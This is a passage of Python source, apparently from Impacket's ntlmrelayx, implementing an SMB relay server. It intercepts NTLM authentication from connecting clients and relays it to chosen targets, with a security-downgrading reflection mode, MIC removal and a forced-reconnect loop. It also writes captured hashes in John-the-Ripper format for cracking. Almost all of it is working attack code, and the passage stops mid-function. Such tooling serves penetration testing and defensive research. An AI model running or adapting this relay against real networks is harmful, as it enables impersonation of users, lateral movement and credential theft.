# Impacket - Collection of Python classes for working with network protocols.
#
# SECUREAUTH LABS. Copyright (C) 2022 SecureAuth Corporation. All rights reserved.
#
# This software is provided under a slightly modified version
# of the Apache Software License. See the accompanying LICENSE file
# for more information.
#
# Description:
#   SMB Relay Server
#
#   This is the SMB server which relays the connections
#   to other protocols
#
# Authors:
#   Alberto Solino (@agsolino)
#   Dirk-jan Mollema / Fox-IT (https://www.fox-it.com)
#
from __future__ import division
from __future__ import print_function
from threading import Thread
try:
    import ConfigParser
except ImportError:
    import configparser as ConfigParser
import struct
import logging
import time
import calendar
import random
import string
import socket
import ntpath

from binascii import hexlify, unhexlify
from six import b
from impacket import smb, ntlm, LOG, smb3
from impacket.nt_errors import STATUS_MORE_PROCESSING_REQUIRED, STATUS_ACCESS_DENIED, STATUS_SUCCESS, STATUS_NETWORK_SESSION_EXPIRED, STATUS_BAD_NETWORK_NAME
from impacket.spnego import SPNEGO_NegTokenResp, SPNEGO_NegTokenInit, TypesMech
from impacket.smbserver import SMBSERVER, outputToJohnFormat, writeJohnOutputToFile
from impacket.spnego import ASN1_AID, MechTypes, ASN1_SUPPORTED_MECH
from impacket.examples.ntlmrelayx.servers.socksserver import activeConnections
from impacket.examples.ntlmrelayx.utils.targetsutils import TargetsProcessor
from impacket.smbserver import getFileTime, decodeSMBString, encodeSMBString
from impacket.smb3structs import SMB2Error

class SMBRelayServer(Thread):
    def __init__(self,config):
        Thread.__init__(self)
        self.daemon = True
        self.server = 0
        #Config object
        self.config = config
        #Current target IP
        self.target = None
        #Targets handler
        self.targetprocessor = self.config.target
        #Username we auth as gets stored here later
        self.authUser = None
        self.proxyTranslator = None
 

        # Here we write a mini config for the server
        smbConfig = ConfigParser.ConfigParser()
        smbConfig.add_section('global')
        smbConfig.set('global','server_name','server_name')
        smbConfig.set('global','server_os','UNIX')
        smbConfig.set('global','server_domain','WORKGROUP')
        smbConfig.set('global','log_file','smb.log')
        smbConfig.set('global','credentials_file','')

        if self.config.smb2support is True:
            smbConfig.set("global", "SMB2Support", "True")
        else:
            smbConfig.set("global", "SMB2Support", "False")

        smbConfig.set("global", "anonymous_logon", "False")

        if self.config.outputFile is not None:
            smbConfig.set('global','jtr_dump_path',self.config.outputFile)

        if self.config.SMBServerChallenge is not None:
            smbConfig.set('global', 'challenge', self.config.SMBServerChallenge)

        # IPC always needed
        smbConfig.add_section('IPC$')
        smbConfig.set('IPC$','comment','')
        smbConfig.set('IPC$','read only','yes')
        smbConfig.set('IPC$','share type','3')
        smbConfig.set('IPC$','path','')

        # Change address_family to IPv6 if this is configured
        if self.config.ipv6:
            SMBSERVER.address_family = socket.AF_INET6

        # changed to dereference configuration interfaceIp
        if self.config.listeningPort:
            smbport = self.config.listeningPort
        else:
            smbport = 445

        self.server = SMBSERVER((config.interfaceIp,smbport), config_parser = smbConfig)
        logging.getLogger('impacket.smbserver').setLevel(logging.CRITICAL)

        self.server.processConfigFile()

        self.origSmbComNegotiate = self.server.hookSmbCommand(smb.SMB.SMB_COM_NEGOTIATE, self.SmbComNegotiate)
        self.origSmbSessionSetupAndX = self.server.hookSmbCommand(smb.SMB.SMB_COM_SESSION_SETUP_ANDX, self.SmbSessionSetupAndX)
        self.origsmbComTreeConnectAndX = self.server.hookSmbCommand(smb.SMB.SMB_COM_TREE_CONNECT_ANDX, self.smbComTreeConnectAndX)

        self.origSmbNegotiate = self.server.hookSmb2Command(smb3.SMB2_NEGOTIATE, self.SmbNegotiate)
        self.origSmbSessionSetup = self.server.hookSmb2Command(smb3.SMB2_SESSION_SETUP, self.SmbSessionSetup)
        self.origsmb2TreeConnect = self.server.hookSmb2Command(smb3.SMB2_TREE_CONNECT, self.smb2TreeConnect)
        # Let's use the SMBServer Connection dictionary to keep track of our client connections as well
        #TODO: See if this is the best way to accomplish this

        # changed to dereference configuration interfaceIp
        self.server.addConnection('SMBRelay', config.interfaceIp, 445)

    ### SMBv2 Part #################################################################
    def SmbNegotiate(self, connId, smbServer, recvPacket, isSMB1=False):
        connData = smbServer.getConnectionData(connId, checkStatus=False)

        respPacket = smb3.SMB2Packet()
        respPacket['Flags'] = smb3.SMB2_FLAGS_SERVER_TO_REDIR
        respPacket['Status'] = STATUS_SUCCESS
        respPacket['CreditRequestResponse'] = 1
        respPacket['Command'] = smb3.SMB2_NEGOTIATE
        respPacket['SessionID'] = 0

        if self.config.disableMulti:
            if self.config.mode.upper() == 'REFLECTION':
                self.targetprocessor = TargetsProcessor(singleTarget='SMB://%s:445/' % connData['ClientIP'])

            self.target = self.targetprocessor.getTarget(multiRelay=False)
            if self.target is None:
                LOG.info('SMBD-%s: Connection from %s controlled, but there are no more targets left!' %
                         (connId, connData['ClientIP']))
                return [SMB2Error()], None, STATUS_BAD_NETWORK_NAME

            LOG.info("SMBD-%s: Received connection from %s, attacking target %s://%s" % (connId, connData['ClientIP'], self.target.scheme,
                                                                                      self.target.netloc))
            try:
                if self.config.mode.upper() == 'REFLECTION':
                    # Force standard security when doing reflection
                    LOG.debug("Downgrading to standard security")
                    extSec = False
                    #recvPacket['Flags2'] += (~smb.SMB.FLAGS2_EXTENDED_SECURITY)
                else:
                    extSec = True
                # Init the correct client for our target
                client = self.init_client(extSec)
            except Exception as e:
                LOG.error("Connection against target %s://%s FAILED: %s" % (self.target.scheme, self.target.netloc, str(e)))
                self.targetprocessor.logTarget(self.target)
            else:
                connData['SMBClient'] = client
                connData['EncryptionKey'] = client.getStandardSecurityChallenge()
                smbServer.setConnectionData(connId, connData)

        if isSMB1 is False:
            respPacket['MessageID'] = recvPacket['MessageID']
        else:
            respPacket['MessageID'] = 0

        respPacket['TreeID'] = 0

        respSMBCommand = smb3.SMB2Negotiate_Response()
        
        # Just for the Nego Packet, then disable it
        respSMBCommand['SecurityMode'] = smb3.SMB2_NEGOTIATE_SIGNING_ENABLED

        if isSMB1 is True:
            # Let's first parse the packet to see if the client supports SMB2
            SMBCommand = smb.SMBCommand(recvPacket['Data'][0])

            dialects = SMBCommand['Data'].split(b'\x02')
            if b'SMB 2.002\x00' in dialects or b'SMB 2.???\x00' in dialects:
                respSMBCommand['DialectRevision'] = smb3.SMB2_DIALECT_002
                #respSMBCommand['DialectRevision'] = smb3.SMB2_DIALECT_21
            else:
                # Client does not support SMB2 fallbacking
                raise Exception('Client does not support SMB2, fallbacking')
        else:
            respSMBCommand['DialectRevision'] = smb3.SMB2_DIALECT_002
            #respSMBCommand['DialectRevision'] = smb3.SMB2_DIALECT_21

        respSMBCommand['ServerGuid'] = b(''.join([random.choice(string.ascii_letters) for _ in range(16)]))
        respSMBCommand['Capabilities'] = 0
        respSMBCommand['MaxTransactSize'] = 65536
        respSMBCommand['MaxReadSize'] = 65536
        respSMBCommand['MaxWriteSize'] = 65536
        respSMBCommand['SystemTime'] = getFileTime(calendar.timegm(time.gmtime()))
        respSMBCommand['ServerStartTime'] = getFileTime(calendar.timegm(time.gmtime()))
        respSMBCommand['SecurityBufferOffset'] = 0x80

        blob = SPNEGO_NegTokenInit()
        blob['MechTypes'] = [TypesMech['NEGOEX - SPNEGO Extended Negotiation Security Mechanism'],
                             TypesMech['NTLMSSP - Microsoft NTLM Security Support Provider']]


        respSMBCommand['Buffer'] = blob.getData()
        respSMBCommand['SecurityBufferLength'] = len(respSMBCommand['Buffer'])

        respPacket['Data'] = respSMBCommand

        smbServer.setConnectionData(connId, connData)

        return None, [respPacket], STATUS_SUCCESS


    def SmbSessionSetup(self, connId, smbServer, recvPacket):
        connData = smbServer.getConnectionData(connId, checkStatus = False)

        #############################################################
        # SMBRelay
        # Are we ready to relay or should we just do local auth?
        if not self.config.disableMulti and 'relayToHost' not in connData:
            # Just call the original SessionSetup
            respCommands, respPackets, errorCode = self.origSmbSessionSetup(connId, smbServer, recvPacket)
            # We remove the Guest flag
            if 'SessionFlags' in respCommands[0].fields:
                respCommands[0]['SessionFlags'] = 0x00
            return respCommands, respPackets, errorCode

        # We have confirmed we want to relay to the target host.
        respSMBCommand = smb3.SMB2SessionSetup_Response()
        sessionSetupData = smb3.SMB2SessionSetup(recvPacket['Data'])

        connData['Capabilities'] = sessionSetupData['Capabilities']

        securityBlob = sessionSetupData['Buffer']

        rawNTLM = False
        if struct.unpack('B',securityBlob[0:1])[0] == ASN1_AID:
           # NEGOTIATE packet
           blob =  SPNEGO_NegTokenInit(securityBlob)
           token = blob['MechToken']
           if len(blob['MechTypes'][0]) > 0:
               # Is this GSSAPI NTLM or something else we don't support?
               mechType = blob['MechTypes'][0]
               if mechType != TypesMech['NTLMSSP - Microsoft NTLM Security Support Provider'] and \
                               mechType != TypesMech['NEGOEX - SPNEGO Extended Negotiation Security Mechanism']:
                   # Nope, do we know it?
                   if mechType in MechTypes:
                       mechStr = MechTypes[mechType]
                   else:
                       mechStr = hexlify(mechType)
                   smbServer.log("Unsupported MechType '%s'" % mechStr, logging.CRITICAL)
                   # We don't know the token, we answer back again saying
                   # we just support NTLM.
                   respToken = SPNEGO_NegTokenResp()
                   respToken['NegState'] = b'\x03'  # request-mic
                   respToken['SupportedMech'] = TypesMech['NTLMSSP - Microsoft NTLM Security Support Provider']
                   respToken = respToken.getData()
                   respSMBCommand['SecurityBufferOffset'] = 0x48
                   respSMBCommand['SecurityBufferLength'] = len(respToken)
                   respSMBCommand['Buffer'] = respToken

                   return [respSMBCommand], None, STATUS_MORE_PROCESSING_REQUIRED
        elif struct.unpack('B',securityBlob[0:1])[0] == ASN1_SUPPORTED_MECH:
           # AUTH packet
           blob = SPNEGO_NegTokenResp(securityBlob)
           token = blob['ResponseToken']
        else:
           # No GSSAPI stuff, raw NTLMSSP
           rawNTLM = True
           token = securityBlob

        # Here we only handle NTLMSSP, depending on what stage of the
        # authentication we are, we act on it
        messageType = struct.unpack('<L',token[len('NTLMSSP\x00'):len('NTLMSSP\x00')+4])[0]

        if messageType == 0x01:
            # NEGOTIATE_MESSAGE
            negotiateMessage = ntlm.NTLMAuthNegotiate()
            negotiateMessage.fromString(token)
            # Let's store it in the connection data
            connData['NEGOTIATE_MESSAGE'] = negotiateMessage

            #############################################################
            # SMBRelay: Ok.. So we got a NEGOTIATE_MESSAGE from a client.
            # Let's send it to the target server and send the answer back to the client.
            client = connData['SMBClient']
            try:
                challengeMessage = self.do_ntlm_negotiate(client, token)
            except Exception as e:
                LOG.debug("Exception:", exc_info=True)
                # Log this target as processed for this client
                self.targetprocessor.logTarget(self.target)
                # Raise exception again to pass it on to the SMB server
                raise

             #############################################################

            if rawNTLM is False:
                respToken = SPNEGO_NegTokenResp()
                # accept-incomplete. We want more data
                respToken['NegState'] = b'\x01'
                respToken['SupportedMech'] = TypesMech['NTLMSSP - Microsoft NTLM Security Support Provider']

                respToken['ResponseToken'] = challengeMessage.getData()
            else:
                respToken = challengeMessage

            # Setting the packet to STATUS_MORE_PROCESSING
            errorCode = STATUS_MORE_PROCESSING_REQUIRED
            # Let's set up an UID for this connection and store it
            # in the connection's data
            connData['Uid'] = random.randint(1,0xffffffff)

            connData['CHALLENGE_MESSAGE'] = challengeMessage

        elif messageType == 0x02:
            # CHALLENGE_MESSAGE
            raise Exception('Challenge Message raise, not implemented!')

        elif messageType == 0x03:
            # AUTHENTICATE_MESSAGE, here we deal with authentication
            #############################################################
            # SMBRelay: Ok, so now the have the Auth token, let's send it
            # back to the target system and hope for the best.
            client = connData['SMBClient']
            authenticateMessage = ntlm.NTLMAuthChallengeResponse()
            authenticateMessage.fromString(token)
            self.authUser = ('%s/%s' % (authenticateMessage['domain_name'].decode('utf-16le'),
                                        authenticateMessage['user_name'].decode('utf-16le'))).upper()

            if rawNTLM is True:
                respToken2 = SPNEGO_NegTokenResp()
                respToken2['ResponseToken'] = securityBlob
                securityBlob = respToken2.getData()

            if self.config.remove_mic:
                clientResponse, errorCode = self.do_ntlm_auth(client, token,
                                                              connData['CHALLENGE_MESSAGE']['challenge'])
            else:
                clientResponse, errorCode = self.do_ntlm_auth(client, securityBlob,
                                                              connData['CHALLENGE_MESSAGE']['challenge'])

            if errorCode != STATUS_SUCCESS:
                #Log this target as processed for this client
                self.targetprocessor.logTarget(self.target)
                LOG.error("Authenticating against %s://%s as %s FAILED" % (self.target.scheme, self.target.netloc, self.authUser))
                client.killConnection()
            else:
                # We have a session, create a thread and do whatever we want
                LOG.info("Authenticating against %s://%s as %s SUCCEED" % (self.target.scheme, self.target.netloc, self.authUser))
                # Log this target as processed for this client
                self.targetprocessor.logTarget(self.target, True, self.authUser)

                ntlm_hash_data = outputToJohnFormat(connData['CHALLENGE_MESSAGE']['challenge'],
                                                    authenticateMessage['user_name'],
                                                    authenticateMessage['domain_name'], authenticateMessage['lanman'],
                                                    authenticateMessage['ntlm'])
                client.sessionData['JOHN_OUTPUT'] = ntlm_hash_data

                if self.server.getJTRdumpPath() != '':
                    writeJohnOutputToFile(ntlm_hash_data['hash_string'], ntlm_hash_data['hash_version'],
                                          self.server.getJTRdumpPath())

                connData['Authenticated'] = True
                if not self.config.disableMulti:
                    del(connData['relayToHost'])
                self.do_attack(client)
                # Now continue with the server
            #############################################################

            if rawNTLM is False:
                respToken = SPNEGO_NegTokenResp()
                # accept-completed
                respToken['NegState'] = b'\x00'
            else:
                respToken = ''
            # Let's store it in the connection data
            connData['AUTHENTICATE_MESSAGE'] = authenticateMessage
        else:
            raise Exception("Unknown NTLMSSP MessageType %d" % messageType)

        respSMBCommand['SecurityBufferOffset'] = 0x48
        respSMBCommand['SecurityBufferLength'] = len(respToken)
        if respSMBCommand['SecurityBufferLength'] > 0:
            respSMBCommand['Buffer'] = respToken.getData()
        else:
            respSMBCommand['Buffer'] = ''

        smbServer.setConnectionData(connId, connData)

        return [respSMBCommand], None, errorCode

    def smb2TreeConnect(self, connId, smbServer, recvPacket):
        connData = smbServer.getConnectionData(connId)

        authenticateMessage = connData['AUTHENTICATE_MESSAGE']

        self.authUser = ('%s/%s' % (authenticateMessage['domain_name'].decode ('utf-16le'),
                                    authenticateMessage['user_name'].decode ('utf-16le'))).upper ()

        if self.config.disableMulti:
            return self.origsmb2TreeConnect(connId, smbServer, recvPacket)
        # Uncommenting this will stop at the first connection relayed and won't relaying until all targets
        # are processed. There might be a use case for this
        #if 'relayToHost' in connData:
        #    # Connection already relayed, let's just answer the request (that will return object not found)
        #    return self.origsmb2TreeConnect(connId, smbServer, recvPacket)

        try:
            if self.config.mode.upper () == 'REFLECTION':
                self.targetprocessor = TargetsProcessor (singleTarget='SMB://%s:445/' % connData['ClientIP'])

            self.target = self.targetprocessor.getTarget(identity = self.authUser)
            if self.target is None:
                # No more targets to process, just let the victim to fail later
                LOG.info('SMBD-%s: Connection from %s@%s controlled, but there are no more targets left!' %
                         (connId, self.authUser, connData['ClientIP']))
                return self.origsmb2TreeConnect (connId, smbServer, recvPacket)

            LOG.info('SMBD-%s: Connection from %s@%s controlled, attacking target %s://%s' % (connId, self.authUser,
                                                        connData['ClientIP'], self.target.scheme, self.target.netloc))

            if self.config.mode.upper() == 'REFLECTION':
                # Force standard security when doing reflection
                LOG.debug("Downgrading to standard security")
                extSec = False
                #recvPacket['Flags2'] += (~smb.SMB.FLAGS2_EXTENDED_SECURITY)
            else:
                extSec = True
            # Init the correct client for our target
            client = self.init_client(extSec)
        except Exception as e:
            LOG.error("Connection against target %s://%s FAILED: %s" % (self.target.scheme, self.target.netloc, str(e)))
            self.targetprocessor.logTarget(self.target)
        else:
            connData['relayToHost'] = True
            connData['Authenticated'] = False
            del (connData['NEGOTIATE_MESSAGE'])
            del (connData['CHALLENGE_MESSAGE'])
            del (connData['AUTHENTICATE_MESSAGE'])
            connData['SMBClient'] = client
            connData['EncryptionKey'] = client.getStandardSecurityChallenge()
            smbServer.setConnectionData(connId, connData)

        respPacket = smb3.SMB2Packet()
        respPacket['Flags']     = smb3.SMB2_FLAGS_SERVER_TO_REDIR
        respPacket['Status']    = STATUS_SUCCESS
        respPacket['CreditRequestResponse'] = 1
        respPacket['Command']   = recvPacket['Command']
        respPacket['SessionID'] = connData['Uid']
        respPacket['Reserved']  = recvPacket['Reserved']
        respPacket['MessageID'] = recvPacket['MessageID']
        respPacket['TreeID']    = recvPacket['TreeID']

        respSMBCommand        = smb3.SMB2TreeConnect_Response()

        # This is the key, force the client to reconnect.
        # It will loop until all targets are processed for this user
        errorCode = STATUS_NETWORK_SESSION_EXPIRED


        respPacket['Status'] = errorCode
        respSMBCommand['Capabilities'] = 0
        respSMBCommand['MaximalAccess'] = 0x000f01ff

        respPacket['Data'] = respSMBCommand

        # Sign the packet if needed
        if connData['SignatureEnabled']:
            smbServer.signSMBv2(respPacket, connData['SigningSessionKey'])

        smbServer.setConnectionData(connId, connData)

        return None, [respPacket], errorCode

    ################################################################################

    ### SMBv1 Part #################################################################
    def SmbComNegotiate(self, connId, smbServer, SMBCommand, recvPacket):
        connData = smbServer.getConnectionData(connId, checkStatus = False)

        if self.config.disableMulti:
            if self.config.mode.upper() == 'REFLECTION':
                self.targetprocessor = TargetsProcessor(singleTarget='SMB://%s:445/' % connData['ClientIP'])

            self.target = self.targetprocessor.getTarget(multiRelay=False)
            if self.target is None:
                LOG.info('SMBD-%s: Connection from %s controlled, but there are no more targets left!' %
                         (connId, connData['ClientIP']))
                return [smb.SMBCommand(smb.SMB.SMB_COM_NEGOTIATE)], None, STATUS_BAD_NETWORK_NAME

            LOG.info("SMBD-%s: Received connection from %s, attacking target %s://%s" % (connId, connData['ClientIP'],
                                                                                         self.target.scheme, self.target.netloc))

            try:
                if recvPacket['Flags2'] & smb.SMB.FLAGS2_EXTENDED_SECURITY == 0:
                    extSec = False
                else:
                    if self.config.mode.upper() == 'REFLECTION':
                        # Force standard security when doing reflection
                        LOG.debug("Downgrading to standard security")
                        extSec = False
                        recvPacket['Flags2'] += (~smb.SMB.FLAGS2_EXTENDED_SECURITY)
                    else:
                        extSec = True

                # Init the correct client for our target
                client = self.init_client(extSec)
            except Exception as e:
                LOG.error(
                    "Connection against target %s://%s FAILED: %s" % (self.target.scheme, self.target.netloc, str(e)))
                self.targetprocessor.logTarget(self.target)
            else:
                connData['SMBClient'] = client
                connData['EncryptionKey'] = client.getStandardSecurityChallenge()
                smbServer.setConnectionData(connId, connData)

        else:
            if (recvPacket['Flags2'] & smb.SMB.FLAGS2_EXTENDED_SECURITY) != 0:
                if self.config.mode.upper() == 'REFLECTION':
                    # Force standard security when doing reflection
                    LOG.debug("Downgrading to standard security")
                    recvPacket['Flags2'] += (~smb.SMB.FLAGS2_EXTENDED_SECURITY)

        return self.origSmbComNegotiate(connId, smbServer, SMBCommand, recvPacket)
        #############################################################

    def SmbSessionSetupAndX(self, connId, smbServer, SMBCommand, recvPacket):

        connData = smbServer.getConnectionData(connId, checkStatus = False)

        #############################################################
        # SMBRelay
        # Are we ready to relay or should we just do local auth?
        if not self.config.disableMulti and 'relayToHost' not in connData:
            # Just call the original SessionSetup
            return self.origSmbSessionSetupAndX(connId, smbServer, SMBCommand, recvPacket)
        # We have confirmed we want to relay to the target host.
        respSMBCommand = smb.SMBCommand(smb.SMB.SMB_COM_SESSION_SETUP_ANDX)

        if connData['_dialects_parameters']['Capabilities'] & smb.SMB.CAP_EXTENDED_SECURITY:
            # Extended security. Here we deal with all SPNEGO stuff
            respParameters = smb.SMBSessionSetupAndX_Extended_Response_Parameters()
            respData       = smb.SMBSessionSetupAndX_Extended_Response_Data()
            sessionSetupParameters = smb.SMBSessionSetupAndX_Extended_Parameters(SMBCommand['Parameters'])
            sessionSetupData = smb.SMBSessionSetupAndX_Extended_Data()
            sessionSetupData['SecurityBlobLength'] = sessionSetupParameters['SecurityBlobLength']
            sessionSetupData.fromString(SMBCommand['Data'])
            connData['Capabilities'] = sessionSetupParameters['Capabilities']

            rawNTLM = False
            if struct.unpack('B',sessionSetupData['SecurityBlob'][0:1])[0] != ASN1_AID:
               # If there no GSSAPI ID, it must be an AUTH packet
               blob = SPNEGO_NegTokenResp(sessionSetupData['SecurityBlob'])
               token = blob['ResponseToken']
            else:
               # NEGOTIATE packet
               blob =  SPNEGO_NegTokenInit(sessionSetupData['SecurityBlob'])
               token = blob['MechToken']

            # Here we only handle NTLMSSP, depending on what stage of the
            # authentication we are, we act on it
            messageType = struct.unpack('<L',token[len('NTLMSSP\x00'):len('NTLMSSP\x00')+4])[0]

            if messageType == 0x01:
                # NEGOTIATE_MESSAGE
                negotiateMessage = ntlm.NTLMAuthNegotiate()
                negotiateMessage.fromString(token)
                # Let's store it in the connection data
                connData['NEGOTIATE_MESSAGE'] = negotiateMessage

                #############################################################
                # SMBRelay: Ok.. So we got a NEGOTIATE_MESSAGE from a client.
                # Let's send it to the target server and send the answer back to the client.
                client = connData['SMBClient']
                try:
                    challengeMessage = self.do_ntlm_negotiate(client,token)
                except Exception:
                    # Log this target as processed for this client
                    self.targetprocessor.logTarget(self.target)
                    # Raise exception again to pass it on to the SMB server
                    raise

                #############################################################

                respToken = SPNEGO_NegTokenResp()
                # accept-incomplete. We want more data
                respToken['NegState'] = b'\x01'
                respToken['SupportedMech'] = TypesMech['NTLMSSP - Microsoft NTLM Security Support Provider']
                respToken['ResponseToken'] = challengeMessage.getData()

                # Setting the packet to STATUS_MORE_PROCESSING
                errorCode = STATUS_MORE_PROCESSING_REQUIRED

                # Let's set up an UID for this connection and store it
                # in the connection's data
                # Picking a fixed value
                # TODO: Manage more UIDs for the same session
                connData['Uid'] = 10

                connData['CHALLENGE_MESSAGE'] = challengeMessage

            elif messageType == 0x03:
                # AUTHENTICATE_MESSAGE, here we deal with authentication
                #############################################################
                # SMBRelay: Ok, so now the have the Auth token, let's send it
                # back to the target system and hope for the best.
                client = connData['SMBClient']
                authenticateMessage = ntlm.NTLMAuthChallengeResponse()
                authenticateMessage.fromString(token)
                self.authUser = ('%s/%s' % (authenticateMessage['domain_name'].decode('utf-16le'),
                                            authenticateMessage['user_name'].decode('utf-16le'))).upper()

                clientResponse, errorCode = self.do_ntlm_auth(client,sessionSetupData['SecurityBlob'],
                                                              connData['CHALLENGE_MESSAGE']['challenge'])

                if errorCode != STATUS_SUCCESS:
                    # Let's return what the target returned, hope the client connects back again
                    packet = smb.NewSMBPacket()
                    packet['Flags1']  = smb.SMB.FLAGS1_REPLY | smb.SMB.FLAGS1_PATHCASELESS
                    packet['Flags2']  = smb.SMB.FLAGS2_NT_STATUS | smb.SMB.FLAGS2_EXTENDED_SECURITY
                    packet['Command'] = recvPacket['Command']
                    packet['Pid']     = recvPacket['Pid']
                    packet['Tid']     = recvPacket['Tid']
                    packet['Mid']     = recvPacket['Mid']
                    packet['Uid']     = recvPacket['Uid']
                    packet['Data']    = b'\x00\x00\x00'
                    packet['ErrorCode']   = errorCode >> 16
                    packet['ErrorClass']  = errorCode & 0xff

                    LOG.error("Authenticating against %s://%s as %s FAILED" % (self.target.scheme, self.target.netloc, self.authUser))

                    #Log this target as processed for this client
                    self.targetprocessor.logTarget(self.target)

                    client.killConnection()

                    return None, [packet], errorCode
                else:
                    # We have a session, create a thread and do whatever we want
                    LOG.info("Authenticating against %s://%s as %s SUCCEED" % (self.target.scheme, self.target.netloc, self.authUser))

                    # Log this target as processed for this client
                    self.targetprocessor.logTarget(self.target, True, self.authUser)

                    ntlm_hash_data = outputToJohnFormat(connData['CHALLENGE_MESSAGE']['challenge'],
                                                        authenticateMessage['user_name'],
                                                        authenticateMessage['domain_name'],
                                                        authenticateMessage['lanman'], authenticateMessage['ntlm'])
                    client.sessionData['JOHN_OUTPUT'] = ntlm_hash_data

                    if self.server.getJTRdumpPath() != '':
                        writeJohnOutputToFile(ntlm_hash_data['hash_string'], ntlm_hash_data['hash_version'],
                                              self.server.getJTRdumpPath())

                    self.do_attack(client)
                    # Now continue with the server
                #############################################################

                respToken = SPNEGO_NegTokenResp()
                # accept-completed
                respToken['NegState'] = b'\x00'

                # Done with the relay for now.
                connData['Authenticated'] = True
                del(connData['relayToHost'])

                # Status SUCCESS
                errorCode = STATUS_SUCCESS
                # Let's store it in the connection data
                connData['AUTHENTICATE_MESSAGE'] = authenticateMessage
            else:
                raise Exception("Unknown NTLMSSP MessageType %d" % messageType)

            respParameters['SecurityBlobLength'] = len(respToken)

            respData['SecurityBlobLength'] = respParameters['SecurityBlobLength']
            respData['SecurityBlob']       = respToken.getData()

        else:
            # Process Standard Security
            #TODO: Fix this for other protocols than SMB [!]
            respParameters = smb.SMBSessionSetupAndXResponse_Parameters()
            respData       = smb.SMBSessionSetupAndXResponse_Data()
            sessionSetupParameters = smb.SMBSessionSetupAndX_Parameters(SMBCommand['Parameters'])
            sessionSetupData = smb.SMBSessionSetupAndX_Data()
            sessionSetupData['AnsiPwdLength'] = sessionSetupParameters['AnsiPwdLength']
            sessionSetupData['UnicodePwdLength'] = sessionSetupParameters['UnicodePwdLength']
            sessionSetupData.fromString(SMBCommand['Data'])

            client = connData['SMBClient']
            _, errorCode = client.sendStandardSecurityAuth(sessionSetupData)

            if errorCode != STATUS_SUCCESS:
                # Let's return what the target returned, hope the client connects back again
                packet = smb.NewSMBPacket()
                packet['Flags1']  = smb.SMB.FLAGS1_REPLY | smb.SMB.FLAGS1_PATHCASELESS
                packet['Flags2']  = smb.SMB.FLAGS2_NT_STATUS | smb.SMB.FLAGS2_EXTENDED_SECURITY
                packet['Command'] = recvPacket['Command']
                packet['Pid']     = recvPacket['Pid']
                packet['Tid']     = recvPacket['Tid']
                packet['Mid']     = recvPacket['Mid']
                packet['Uid']     = recvPacket['Uid']
                packet['Data']    = b'\x00\x00\x00'
                packet['ErrorCode']   = errorCode >> 16
                packet['ErrorClass']  = errorCode & 0xff

                #Log this target as processed for this client
                self.targetprocessor.logTarget(self.target)

                # Finish client's connection
                #client.killConnection()

                return None, [packet], errorCode
            else:
                # We have a session, create a thread and do whatever we want
                self.authUser = ('%s/%s' % (sessionSetupData['PrimaryDomain'], sessionSetupData['Account'])).upper()
                LOG.info("Authenticating against %s://%s as %s SUCCEED" % (self.target.scheme, self.target.netloc, self.authUser))

                # Log this target as processed for this client
                self.targetprocessor.logTarget(self.target, True, self.authUser)

                ntlm_hash_data = outputToJohnFormat('', sessionSetupData['Account'], sessionSetupData['PrimaryDomain'],
                                                    sessionSetupData['AnsiPwd'], sessionSetupData['UnicodePwd'])
                client.sessionData['JOHN_OUTPUT'] = ntlm_hash_data

                if self.server.getJTRdumpPath() != '':
                    writeJohnOutputToFile(ntlm_hash_data['hash_string'], ntlm_hash_data['hash_version'],
                                          self.server.getJTRdumpPath())

                # Done with the relay for now.
                connData['Authenticated'] = True
                if not self.config.disableMulti:
                    del(connData['relayToHost'])
                self.do_attack(client)
                # Now continue with the server
            #############################################################

        respData['NativeOS']     = smbServer.getServerOS()
        respData['NativeLanMan'] = smbServer.getServerOS()
        respSMBCommand['Parameters'] = respParameters
        respSMBCommand['Data']       = respData


        smbServer.setConnectionData(connId, connData)

        return [respSMBCommand], None, errorCode

    def smbComTreeConnectAndX(self, connId, smbServer, SMBCommand, recvPacket):
        connData = smbServer.getConnectionData(connId)

        authenticateMessage = connData['AUTHENTICATE_MESSAGE']
        self.authUser = ('%s/%s' % (authenticateMessage['domain_name'].decode ('utf-16le'),
                                    authenticateMessage['user_name'].decode ('utf-16le'))).upper ()

        if self.config.disableMulti:
            return self.smbComTreeConnectAndX(connId, smbServer, SMBCommand, recvPacket)
        # Uncommenting this will stop at the first connection relayed and won't relaying until all targets
        # are processed. There might be a use case for this
        #if 'relayToHost' in connData:
        #    # Connection already relayed, let's just answer the request (that will return object not found)
        #    return self.smbComTreeConnectAndX(connId, smbServer, SMBCommand, recvPacket)

        try:
            if self.config.mode.upper () == 'REFLECTION':
                self.targetprocessor = TargetsProcessor (singleTarget='SMB://%s:445/' % connData['ClientIP'])

            self.target = self.targetprocessor.getTarget(identity = self.authUser)
            if self.target is None:
                # No more targets to process, just let the victim to fail later
                LOG.info('SMBD-%s: Connection from %s@%s controlled, but there are no more targets left!' %
                         (connId, self.authUser, connData['ClientIP']))
                return self.origsmbComTreeConnectAndX (connId, smbServer, recvPacket)

            LOG.info('SMBD-%s: Connection from %s@%s controlled, attacking target %s://%s' % ( connId, self.authUser,
                                                        connData['ClientIP'], self.target.scheme, self.target.netloc))

            if self.config.mode.upper() == 'REFLECTION':
                # Force standard security when doing reflection
                LOG.debug("Downgrading to standard security")
                extSec = False
                recvPacket['Flags2'] += (~smb.SMB.FLAGS2_EXTENDED_SECURITY)
            else:
                extSec = True
            # Init the correct client for our target
            client = self.init_client(extSec)
        except Exception as e:
            LOG.error("Connection against target %s://%s FAILED: %s" % (self.target.scheme, self.target.netloc, str(e)))
            self.targetprocessor.logTarget(self.target)
        else:
            connData['relayToHost'] = True
            connData['Authenticated'] = False
            del (connData['NEGOTIATE_MESSAGE'])
            del (connData['CHALLENGE_MESSAGE'])
            del (connData['AUTHENTICATE_MESSAGE'])
            connData['SMBClient'] = client
            connData['EncryptionKey'] = client.getStandardSecurityChallenge()
            smbServer.setConnectionData(connId, connData)

        resp = smb.NewSMBPacket()
        resp['Flags1'] = smb.SMB.FLAGS1_REPLY
        resp['Flags2'] = smb.SMB.FLAGS2_EXTENDED_SECURITY | smb.SMB.FLAGS2_NT_STATUS | smb.SMB.FLAGS2_LONG_NAMES | \
                         recvPacket['Flags2'] & smb.SMB.FLAGS2_UNICODE

        resp['Tid'] = recvPacket['Tid']
        resp['Mid'] = recvPacket['Mid']
        resp['Pid'] = connData['Pid']

        respSMBCommand        = smb.SMBCommand(smb.SMB.SMB_COM_TREE_CONNECT_ANDX)
        respParameters        = smb.SMBTreeConnectAndXResponse_Parameters()
        respData              = smb.SMBTreeConnectAndXResponse_Data()

        treeConnectAndXParameters = smb.SMBTreeConnectAndX_Parameters(SMBCommand['Parameters'])

